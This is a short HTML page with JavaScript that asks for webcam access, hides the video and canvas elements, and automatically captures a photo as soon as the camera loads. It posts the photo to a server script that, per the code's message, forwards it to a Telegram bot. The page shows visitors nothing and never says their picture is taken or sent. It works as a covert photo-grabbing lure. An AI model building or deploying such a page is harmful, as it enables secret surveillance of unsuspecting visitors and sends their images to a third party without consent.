<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic Camera Capture and Send to Telegram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 20px;
        }
        #video {
            width: 50%;
            border: 1px solid black;
            display: none; /* Hide video element as we don't need to show it */
        }
        #canvas {
            display: none; /* Hide canvas as we don't need to show it */
        }
    </style>
</head>
<body>
  
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        // Access user's webcam
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Get access to user's camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // Once the video is ready, capture the image and send it automatically
                video.addEventListener('loadeddata', captureAndSendPhoto);
            })
            .catch(error => {
                console.error("Error accessing webcam:", error);
            });

        function captureAndSendPhoto() {
            // Set canvas size and draw video frame on canvas
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas image to base64
            const imageDataUrl = canvas.toDataURL('image/png');

            // Send image to server using AJAX
            fetch('send_photo.php', {
                method: 'POST',
                body: JSON.stringify({ image: imageDataUrl }),
                headers: { 'Content-Type': 'application/json' }
            })
            .then(response => response.text())
            .then(data => {
                console.log("Photo sent to Telegram bot successfully");
            })
            .catch(error => {
                console.error("Error sending photo to server:", error);
            });
        }
    </script>
</body>
</html>
